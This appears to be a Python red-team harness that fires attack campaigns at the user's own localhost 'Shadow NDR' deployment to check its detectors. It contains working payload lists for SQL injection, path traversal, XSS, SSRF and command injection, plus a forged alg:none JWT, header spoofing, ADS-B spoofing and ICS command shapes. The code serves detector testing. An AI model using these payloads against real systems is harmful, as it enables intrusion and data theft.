"""
Shadow NDR — Adversary Emulation Harness
─────────────────────────────────────────
Runs a full red-team campaign against your OWN Shadow NDR deployment
(localhost-only via red_team.safety) and exercises every detector
the system is supposed to catch. Designed to be run the day before a
professional pentest so you can fix whatever your NDR misses.

Campaigns:
  auth        — login brute force, JWT tamper, refresh abuse, timing leaks
  tenant      — cross-tenant isolation probes
  injection   — SQLi/XSS/path-traversal/SSRF probes on every :id endpoint
  ratelimit   — header rotation, X-Forwarded-For spoof, burst shaping
  adsb        — spoofed DF17, ICAO impersonation, GPS jumps, impossible kinematics
  industrial  — Modbus / IEC-104 / OPC-UA / DNP3 anomaly shapes
  lateral     — mass-acknowledge, mass-create, mass-delete threats
  exfil       — large export loops, fast polling patterns
  beacon      — periodic C2-shaped callbacks
  evasion     — slow-drip, jitter, user-agent fuzz
  all         — fire every campaign sequentially

This file ONLY makes requests that the harness's safety.enforce()
accepts. Nothing leaves your laptop.
"""

from __future__ import annotations

import argparse
import asyncio
import base64
import json
import logging
import os
import random
import secrets
import sys
import time
from dataclasses import asdict, dataclass, field
from typing import Any, Callable, Dict, List, Optional

import httpx

from .safety import TargetBlocked, enforce

logger = logging.getLogger("red_team")

# ─── Default targets (localhost only — safety.py enforces) ────────────────

DEFAULT_BACKEND = "http://127.0.0.1:3001"
DEFAULT_ML = "http://127.0.0.1:8000"
DEFAULT_FRONTEND = "http://127.0.0.1:3000"

# Known tenant admin usernames from your schema
REAL_USERNAMES = ["elal_admin", "israir_admin", "arkia_admin"]

# ─── Metrics ──────────────────────────────────────────────────────────────

@dataclass
class AttackResult:
    technique: str
    sub_technique: str
    url: str
    method: str
    status: int
    elapsed_ms: float
    note: str = ""
    detected: bool = False  # set later by scoreboard
    ts: float = field(default_factory=time.time)

    def brief(self) -> str:
        return (f"{self.technique:<12} {self.sub_technique:<28} "
                f"{self.method:<6} {self.status:>3}  {self.elapsed_ms:>6.1f}ms  "
                f"{self.note}")


class Campaign:
    """Shared execution context: HTTP client, result log, rate limit."""

    def __init__(self, backend: str, ml: str, rate_per_sec: float = 25.0,
                 stealth: bool = False, verbose: bool = False,
                 dry_run: bool = False):
        enforce(backend)
        enforce(ml)
        self.backend = backend.rstrip("/")
        self.ml = ml.rstrip("/")
        self.rate = rate_per_sec
        self.stealth = stealth
        self.verbose = verbose
        self.dry_run = dry_run
        self.client = httpx.AsyncClient(
            timeout=httpx.Timeout(5.0, connect=2.0),
            verify=False,
            follow_redirects=False,
        )
        self.results: List[AttackResult] = []
        self._token: Optional[str] = None
        self._last_call = 0.0

    async def close(self):
        await self.client.aclose()

    async def _throttle(self):
        gap = 1.0 / max(self.rate, 0.1)
        if self.stealth:
            gap *= random.uniform(2.0, 8.0)
        wait = gap - (time.time() - self._last_call)
        if wait > 0:
            await asyncio.sleep(wait)
        self._last_call = time.time()

    async def fire(self, technique: str, sub: str, method: str, url: str,
                  **kwargs) -> AttackResult:
        enforce(url)   # CRITICAL: every request goes through the allowlist
        await self._throttle()
        t0 = time.time()
        status = 0
        note = ""
        if self.dry_run:
            note = "DRY_RUN"
            status = 0
        else:
            try:
                r = await self.client.request(method, url, **kwargs)
                status = r.status_code
                if self.verbose:
                    body = r.text[:120].replace("\n", " ")
                    note = body
            except httpx.HTTPError as e:
                status = -1
                note = type(e).__name__
        res = AttackResult(
            technique=technique, sub_technique=sub,
            url=url, method=method, status=status,
            elapsed_ms=(time.time() - t0) * 1000.0, note=note,
        )
        self.results.append(res)
        if self.verbose:
            logger.info(res.brief())
        return res

    async def login_valid(self) -> Optional[str]:
        """Attempt a real login (if creds are known via env) to get a token
        for tenant-bypass tests. Never required."""
        user = os.environ.get("RT_USER", "elal_admin")
        pw = os.environ.get("RT_PASS", "")
        if not pw:
            return None
        try:
            r = await self.client.post(
                f"{self.backend}/login",
                json={"username": user, "password": pw},
            )
            if r.status_code == 200:
                self._token = r.json().get("token")
                return self._token
        except httpx.HTTPError:
            pass
        return None


# ─── Campaign: Authentication ─────────────────────────────────────────────

async def campaign_auth(c: Campaign):
    """Login brute force, JWT tamper, refresh abuse, timing leak, enumeration."""
    T = "auth"

    # 1. Brute force against real usernames (detector should flag repeat failures)
    passwords = ["admin", "password", "123456", "shadow", "elal2024",
                 "P@ssw0rd", "letmein", "welcome", "qwerty", "test"]
    for user in REAL_USERNAMES:
        for pw in passwords:
            await c.fire(T, "brute_force", "POST",
                        f"{c.backend}/login",
                        json={"username": user, "password": pw})

    # 2. Username enumeration — same wrong password, different users
    for user in ["root", "administrator", "superadmin", "system",
                 "nonexistent_tenant_XYZ", "'; DROP TABLE users;--"]:
        await c.fire(T, "user_enum", "POST",
                    f"{c.backend}/login",
                    json={"username": user, "password": "x"})

    # 3. Malformed body — should be rejected, but hammering it is a signal
    for body in ['{"username":}', '{"username":"a","password":{}}',
                 '""', '[]', '{"username":"a","password":"' + "A" * 5000 + '"}']:
        await c.fire(T, "malformed_login", "POST",
                    f"{c.backend}/login",
                    content=body,
                    headers={"content-type": "application/json"})

    # 4. JWT tamper — send garbage / swapped tokens
    forged = base64.urlsafe_b64encode(b'{"alg":"none"}').rstrip(b"=").decode() + "."
    forged += base64.urlsafe_b64encode(b'{"sub":1,"tenant_id":999,"role":"admin"}'
                                       ).rstrip(b"=").decode() + "."
    for tok in [forged, "Bearer " + "A" * 400, "null", "undefined",
                "eyJhbGciOiJub25lIn0.eyJ0ZW5hbnRfaWQiOjF9."]:
        await c.fire(T, "jwt_tamper", "GET",
                    f"{c.backend}/api/dashboard",
                    headers={"Authorization": f"Bearer {tok}"})

    # 5. Refresh token abuse — replay, swap
    for rt in ["stolen_refresh_token_123", "A" * 256, "../../etc/passwd"]:
        await c.fire(T, "refresh_abuse", "POST",
                    f"{c.backend}/refresh",
                    json={"refreshToken": rt})

    # 6. Timing attack pattern — very fast + very slow requests
    for _ in range(20):
        await c.fire(T, "timing_probe", "POST",
                    f"{c.backend}/login",
                    json={"username": "elal_admin",
                         "password": secrets.token_hex(8)})


# ─── Campaign: Multi-tenant isolation ─────────────────────────────────────

async def campaign_tenant(c: Campaign):
    """Try to reach another tenant's data with a valid token."""
    T = "tenant"
    tok = await c.login_valid()
    if not tok:
        logger.info("[tenant] no RT_USER/RT_PASS env, sending unauth probes only")

    # Try accessing every tenant-scoped resource with tampered tenant_id
    for tenant in [1, 2, 3, 999, -1, 0]:
        hdrs = {"Authorization": f"Bearer {tok or 'fake'}",
                "X-Tenant-Id": str(tenant),
                "X-Original-Tenant": str(tenant)}
        for path in ["/api/dashboard", "/api/threats", "/api/assets",
                    "/api/alerts", "/api/reports"]:
            await c.fire(T, f"tenant_hdr_{tenant}", "GET",
                        f"{c.backend}{path}", headers=hdrs)

    # Enumerate asset IDs (IDOR) — MT backend should enforce tenant scope
    for aid in [1, 2, 3, 50, 100, 9999]:
        hdrs = {"Authorization": f"Bearer {tok}"} if tok else {}
        await c.fire(T, "idor_asset", "GET",
                    f"{c.backend}/api/assets/{aid}", headers=hdrs)
        await c.fire(T, "idor_threats", "GET",
                    f"{c.backend}/api/assets/{aid}/threats", headers=hdrs)


# ─── Campaign: Injection probes ───────────────────────────────────────────

SQLI_PAYLOADS = [
    "1' OR '1'='1", "1' UNION SELECT null,null,null--",
    "1; DROP TABLE threats;--", "1' AND SLEEP(3)--",
    "1' OR pg_sleep(2)--", "' OR 1=1 /*",
    "1) OR 1=1--", "admin'--",
]
TRAVERSAL = ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
             "/etc/shadow%00", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"]
XSS = ['<script>alert(1)</script>', '"><svg/onload=alert(1)>',
       "javascript:alert(1)", "'\"><img src=x onerror=alert(1)>"]
SSRF = ["http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:6379/info",
        "file:///etc/passwd",
        "gopher://127.0.0.1:5432/_"]


async def campaign_injection(c: Campaign):
    T = "injection"
    # SQLi shape in URL params
    for p in SQLI_PAYLOADS:
        enc = httpx.QueryParams({"q": p, "severity": p, "id": p})
        for path in ["/api/threats", "/api/assets", "/api/alerts",
                    "/api/reports"]:
            await c.fire(T, "sqli_query", "GET",
                        f"{c.backend}{path}?{enc}")

    # Path traversal in :id params
    for tr in TRAVERSAL:
        for path in [f"/api/threats/{tr}", f"/api/assets/{tr}",
                    f"/api/reports/{tr}",
                    f"/api/reports/aircraft/{tr}"]:
            await c.fire(T, "path_traversal", "GET", f"{c.backend}{path}")

    # XSS in JSON bodies
    for x in XSS:
        await c.fire(T, "xss_body", "POST",
                    f"{c.backend}/api/threats",
                    json={"title": x, "description": x, "severity": "high"})
        await c.fire(T, "xss_alert", "POST",
                    f"{c.backend}/api/alerts",
                    json={"message": x, "severity": "critical"})

    # SSRF probes (backend may fetch URLs for webhooks or reports)
    for s in SSRF:
        await c.fire(T, "ssrf", "POST",
                    f"{c.backend}/api/threats",
                    json={"callback_url": s, "report_url": s,
                         "webhook": s, "source": s})

    # NoSQL / prototype pollution shape
    await c.fire(T, "proto_pollute", "POST",
                f"{c.backend}/login",
                json={"username": {"$ne": None}, "password": {"$ne": None}})
    await c.fire(T, "proto_pollute", "POST",
                f"{c.backend}/api/threats",
                json={"__proto__": {"isAdmin": True}, "title": "x"})

    # Command injection shape in fields that may shell out
    for ci in ["; ls -la", "$(whoami)", "`id`", "| cat /etc/passwd",
               "&& ping -c 1 127.0.0.1"]:
        await c.fire(T, "cmd_inject", "POST",
                    f"{c.backend}/api/threats",
                    json={"title": f"test{ci}", "severity": "high"})


# ─── Campaign: Rate-limit bypass ──────────────────────────────────────────

async def campaign_ratelimit(c: Campaign):
    T = "ratelimit"
    # Rapid-fire with rotating fake IPs
    for i in range(80):
        fake_ip = f"203.0.113.{i % 255}"
        hdrs = {
            "X-Forwarded-For": fake_ip,
            "X-Real-IP": fake_ip,
            "CF-Connecting-IP": fake_ip,
            "Forwarded": f"for={fake_ip}",
            "True-Client-IP": fake_ip,
            "User-Agent": f"rt-fuzz/{i}",
        }
        await c.fire(T, "xff_spoof", "GET",
                    f"{c.backend}/api/sensor/ping", headers=hdrs)

    # Burst against login
    for _ in range(60):
        await c.fire(T, "login_burst", "POST",
                    f"{c.backend}/login",
                    json={"username": "elal_admin",
                         "password": secrets.token_hex(6)})


# ─── Campaign: ADS-B / aviation sensor attacks ────────────────────────────

async def _sensor_post(c: Campaign, sub: str, payload: Dict[str, Any]):
    await c.fire("adsb", sub, "POST",
                f"{c.backend}/api/sensor/data", json=payload)


async def campaign_adsb(c: Campaign):
    """Spoofed DF17, ICAO impersonation, GPS jumps, kinematic impossibilities."""
    # Use the real APEX ghost-traffic encoder for protocol-correct frames
    try:
        from apex.deception.ghost_traffic import (
            build_df17, encode_ident_me, encode_position_me,
            encode_velocity_me,
        )
        have_apex = True
    except ImportError:
        have_apex = False

    # 1. Impossible kinematic jump (200 nm in 1 second → UNSAT for Proof of Breach)
    base = {"icao24": "738A5B", "callsign": "ELY100",
            "sensor_id": "rt-fuzz-01"}
    t0 = time.time()
    await _sensor_post(c, "kinematic_t0",
                      {**base, "t": t0, "lat": 32.0, "lon": 34.9,
                       "alt_ft": 34000, "speed_kts": 450, "heading": 90})
    await _sensor_post(c, "kinematic_jump",
                      {**base, "t": t0 + 1, "lat": 35.3, "lon": 38.5,
                       "alt_ft": 34000, "speed_kts": 450, "heading": 90})

    # 2. ICAO impersonation — same ICAO, two sensors, two cities
    for sensor_id, (lat, lon) in [("rt-fuzz-01", (32.01, 34.88)),
                                  ("rt-fuzz-02", (41.3, 2.07))]:
        await _sensor_post(c, "icao_impersonation", {
            **base, "sensor_id": sensor_id, "t": time.time(),
            "lat": lat, "lon": lon, "alt_ft": 34000,
            "speed_kts": 450, "heading": 90,
        })

    # 3. GPS jump / teleport
    await _sensor_post(c, "gps_jump", {
        **base, "t": time.time(), "lat": 0.0, "lon": 0.0,
        "alt_ft": 34000, "speed_kts": 450, "heading": 90,
    })

    # 4. Altitude impossibility
    await _sensor_post(c, "alt_impossible", {
        **base, "t": time.time(), "lat": 32.0, "lon": 34.9,
        "alt_ft": 120000, "speed_kts": 450, "heading": 90,
    })

    # 5. Speed > Mach 2 for civilian
    await _sensor_post(c, "speed_impossible", {
        **base, "t": time.time(), "lat": 32.0, "lon": 34.9,
        "alt_ft": 34000, "speed_kts": 1500, "heading": 90,
    })

    # 6. Ghost swarm (fake ADS-B around protected asset)
    if have_apex:
        from apex.deception.ghost_traffic import spawn_ghost_swarm
        ghosts = spawn_ghost_swarm(0x738A5B, 32.0114, 34.8867, 34000,
                                  count=10, radius_nm=30.0)
        for g in ghosts:
            await _sensor_post(c, "ghost_swarm", {
                "icao24": g.icao_hex, "callsign": g.callsign,
                "t": time.time(), "lat": g.lat, "lon": g.lon,
                "alt_ft": g.alt_ft, "speed_kts": g.speed_kts,
                "heading": g.heading_deg, "sensor_id": "rt-fuzz-01",
            })

    # 7. Replay: same frame 50 times
    stale = {**base, "t": time.time() - 600, "lat": 32.0, "lon": 34.9,
             "alt_ft": 34000, "speed_kts": 450, "heading": 90}
    for _ in range(30):
        await _sensor_post(c, "replay", stale)

    # 8. Raw DF17 bytes in payload (if backend accepts)
    if have_apex:
        me = encode_position_me(32.0, 34.9, 34000, odd=False)
        frame = build_df17(0x000000, me)
        await _sensor_post(c, "null_icao_df17",
                          {"raw_df17_hex": frame.hex(),
                           "sensor_id": "rt-fuzz-01",
                           "t": time.time()})


# ─── Campaign: Industrial protocol shapes ─────────────────────────────────

async def campaign_industrial(c: Campaign):
    """Modbus / IEC-104 / OPC-UA / DNP3 anomaly shapes via /api/sensor/data."""
    T = "industrial"
    base = {"sensor_id": "rt-fuzz-ics-01", "t": time.time()}

    # Modbus — unauthorized function codes (0x08 diagnostic, 0x11 slave id,
    # write-single-coil to critical address)
    for fc in [0x01, 0x05, 0x06, 0x08, 0x11, 0x2B]:
        await c.fire(T, f"modbus_fc_{fc:02x}", "POST",
                    f"{c.backend}/api/sensor/data",
                    json={**base, "protocol": "modbus",
                         "function_code": fc, "register": 40001,
                         "value": 0xDEAD, "unit_id": 1})

    # IEC-104 — STARTDT/STOPDT flood, unauthorized C_SC_NA_1 command
    for apci in ["STARTDT_ACT", "STOPDT_ACT", "TESTFR_ACT"] * 10:
        await c.fire(T, "iec104_apci_flood", "POST",
                    f"{c.backend}/api/sensor/data",
                    json={**base, "protocol": "iec104", "apci": apci})

    for typeid in [45, 46, 50, 100, 101]:   # control commands
        await c.fire(T, f"iec104_cmd_{typeid}", "POST",
                    f"{c.backend}/api/sensor/data",
                    json={**base, "protocol": "iec104",
                         "type_id": typeid, "ca": 1, "ioa": 99,
                         "cause_of_tx": 6, "value": 1})

    # OPC-UA — unauthenticated SecureChannel, oversized messages
    await c.fire(T, "opcua_oversize", "POST",
                f"{c.backend}/api/sensor/data",
                json={**base, "protocol": "opcua",
                     "message": "A" * 65000, "policy": "None"})

    # DNP3 — unsolicited response flood
    for _ in range(15):
        await c.fire(T, "dnp3_unsol", "POST",
                    f"{c.backend}/api/sensor/data",
                    json={**base, "protocol": "dnp3",
                         "function": "UNSOLICITED_RESPONSE",
                         "objects": [{"group": 2, "var": 1}]})


# ─── Campaign: Lateral / destructive API abuse (NON-destructive probe) ────

async def campaign_lateral(c: Campaign):
    """Mass create/ack/delete attempts — tests auth+quota+audit detectors.
    Probe-only: does NOT destroy real data, assumes test tenant."""
    T = "lateral"
    tok = c._token or await c.login_valid()
    hdrs = {"Authorization": f"Bearer {tok}"} if tok else {}

    # 1. Threat flood (DoS-shape, not real DoS)
    for i in range(40):
        await c.fire(T, "threat_flood", "POST",
                    f"{c.backend}/api/threats",
                    headers=hdrs,
                    json={"title": f"rt-noise-{i}", "severity": "low",
                         "description": "red-team validation probe"})

    # 2. Bulk ack spam
    await c.fire(T, "bulk_ack", "POST",
                f"{c.backend}/api/alerts/bulk/acknowledge",
                headers=hdrs,
                json={"alert_ids": list(range(1, 200))})

    # 3. Delete probes (should be rejected by RBAC)
    for i in [1, 2, 3, 9999]:
        await c.fire(T, "delete_probe", "DELETE",
                    f"{c.backend}/api/threats/{i}", headers=hdrs)


# ─── Campaign: Exfil shapes ───────────────────────────────────────────────

async def campaign_exfil(c: Campaign):
    T = "exfil"
    tok = c._token or await c.login_valid()
    hdrs = {"Authorization": f"Bearer {tok}"} if tok else {}

    # Large export loop
    for _ in range(10):
        await c.fire(T, "export_loop", "GET",
                    f"{c.backend}/api/reports/export/all?format=json",
                    headers=hdrs)
        await c.fire(T, "export_csv", "GET",
                    f"{c.backend}/api/reports/export/all?format=csv",
                    headers=hdrs)

    # Rapid polling of all tenant data
    for _ in range(25):
        await c.fire(T, "fast_poll", "GET",
                    f"{c.backend}/api/threats?limit=1000", headers=hdrs)


# ─── Campaign: C2 beaconing pattern ───────────────────────────────────────

async def campaign_beacon(c: Campaign):
    T = "beacon"
    # Regular-interval callback to a public health endpoint — NDR behavior
    # analytics should spot fixed-cadence timing with jitter < 5%.
    for i in range(24):
        await c.fire(T, "periodic_callback", "GET",
                    f"{c.backend}/api/sensor/ping",
                    headers={"User-Agent": "Mozilla/5.0 rt-beacon"})
        await asyncio.sleep(2.5 + random.uniform(-0.05, 0.05))


# ─── Campaign: Evasion (slow + jittered) ──────────────────────────────────

async def campaign_evasion(c: Campaign):
    T = "evasion"
    agents = [
        "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120",
        "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 Chrome/120",
        "curl/7.88.1", "python-requests/2.31.0",
        "", "-", "admin-tool", "SecurityScanner/1.0",
    ]
    c.stealth = True   # switch to slow-drip timing
    for ua in agents:
        hdrs = {"User-Agent": ua} if ua else {}
        await c.fire(T, "slow_ua_fuzz", "GET",
                    f"{c.backend}/api/sensor/ping", headers=hdrs)
    c.stealth = False


# ─── Campaign registry + runner ───────────────────────────────────────────

CAMPAIGNS: Dict[str, Callable] = {
    "auth": campaign_auth,
    "tenant": campaign_tenant,
    "injection": campaign_injection,
    "ratelimit": campaign_ratelimit,
    "adsb": campaign_adsb,
    "industrial": campaign_industrial,
    "lateral": campaign_lateral,
    "exfil": campaign_exfil,
    "beacon": campaign_beacon,
    "evasion": campaign_evasion,
}


async def run(names: List[str], c: Campaign):
    if "all" in names:
        names = list(CAMPAIGNS.keys())
    for n in names:
        fn = CAMPAIGNS.get(n)
        if fn is None:
            logger.warning("unknown campaign: %s", n)
            continue
        logger.info("─── %s campaign ───", n.upper())
        t0 = time.time()
        try:
            await fn(c)
        except TargetBlocked as e:
            logger.error("[%s] BLOCKED by safety: %s", n, e)
        except Exception as e:
            logger.exception("[%s] errored: %s", n, e)
        logger.info("[%s] done in %.1fs", n, time.time() - t0)


def summarise(results: List[AttackResult]) -> Dict[str, Any]:
    by_tech: Dict[str, Dict[str, int]] = {}
    for r in results:
        b = by_tech.setdefault(r.technique, {"total": 0, "2xx": 0, "4xx": 0,
                                             "5xx": 0, "error": 0})
        b["total"] += 1
        if r.status < 0:
            b["error"] += 1
        elif 200 <= r.status < 300:
            b["2xx"] += 1
        elif 400 <= r.status < 500:
            b["4xx"] += 1
        elif 500 <= r.status < 600:
            b["5xx"] += 1
    return {
        "total_attacks": len(results),
        "by_technique": by_tech,
        "start": min((r.ts for r in results), default=0),
        "end": max((r.ts for r in results), default=0),
    }


# ─── CLI ──────────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(description="Shadow NDR red-team harness")
    p.add_argument("--campaign", nargs="+",
                  default=["all"],
                  choices=list(CAMPAIGNS.keys()) + ["all"])
    p.add_argument("--backend", default=DEFAULT_BACKEND)
    p.add_argument("--ml", default=DEFAULT_ML)
    p.add_argument("--rate", type=float, default=25.0, help="req/sec ceiling")
    p.add_argument("--stealth", action="store_true",
                  help="slow jittered timing (evade rate-based detection)")
    p.add_argument("--dry-run", action="store_true",
                  help="print what would be fired, send nothing")
    p.add_argument("--verbose", "-v", action="store_true")
    p.add_argument("--output", "-o", default="red_team_report.json")
    p.add_argument("--score", action="store_true",
                  help="after attacks, query NDR to see what was detected")
    args = p.parse_args()

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
    )

    try:
        camp = Campaign(
            backend=args.backend, ml=args.ml,
            rate_per_sec=args.rate, stealth=args.stealth,
            verbose=args.verbose, dry_run=args.dry_run,
        )
    except TargetBlocked as e:
        logger.error("target blocked: %s", e)
        sys.exit(2)

    async def _go():
        try:
            await run(args.campaign, camp)
            summary = summarise(camp.results)

            if args.score and not args.dry_run:
                from .scoreboard import score_detection
                scored = await score_detection(camp)
                summary["detection"] = scored

            with open(args.output, "w") as f:
                json.dump({
                    "summary": summary,
                    "results": [asdict(r) for r in camp.results],
                }, f, indent=2)
            logger.info("─" * 60)
            logger.info("Fired %d attacks; report: %s",
                       len(camp.results), args.output)
            logger.info("Summary by technique:")
            for tech, counts in summary["by_technique"].items():
                logger.info("  %-12s %s", tech, counts)
            if "detection" in summary:
                d = summary["detection"]
                logger.info("─ detection ─")
                logger.info("  threats logged:  %d", d.get("threats", 0))
                logger.info("  alerts logged:   %d", d.get("alerts", 0))
                logger.info("  coverage score:  %.1f%%",
                           d.get("coverage_pct", 0.0))
        finally:
            await camp.close()

    asyncio.run(_go())


if __name__ == "__main__":
    main()
